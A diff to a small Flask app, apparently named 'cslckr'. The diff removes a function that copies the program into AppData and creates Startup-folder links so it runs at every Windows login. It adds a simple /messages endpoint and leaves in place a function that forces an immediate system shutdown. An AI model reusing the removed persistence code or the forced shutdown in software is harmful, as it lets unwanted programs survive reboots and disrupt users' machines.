@@ -5,23 +5,8 @@ import subprocess
 from flask import Flask, send_file, request, redirect, url_for
  
 app = Flask(__name__)
+messages = []
 
-def create_shortcut():
-    if getattr(sys, 'frozen', False):
-        source_file = sys.executable
-    else:
-        source_file = os.path.abspath(__file__)
-
-    destination_location = os.path.join(os.path.expanduser("~"), "AppData")
-    startup_shortcut_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "cslckr.lnk")
-    programs_shortcut_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "cslckr.lnk")
-
-    if os.name == 'nt':
-        shutil.copy(source_file, destination_location)
-        subprocess.run(["mklink", startup_shortcut_path, source_file], check=True, shell=True)
-        subprocess.run(["mklink", programs_shortcut_path, source_file], check=True, shell=True)
-    else:
-        print("Shortcut creation is only supported on Windows.")
 
 def shutdown():
     subprocess.call(['shutdown', '/s', '/t', '0'])
@@ -49,6 +34,14 @@ def failure():
 def resources(path):
     return send_file(os.path.join('templates', path))
 
+@app.route('/messages', methods=['POST', 'GET'])
+def handle_messages():
+    if request.method == 'POST':
+        message = request.get_json().get('message')
+        messages.append(message)
+        return {'status': 'success'}
+    else:
+        return {'messages': messages}
+
 if __name__ == "__main__":
-    create_shortcut()
     app.run(host='localhost', port=8004, debug=True)
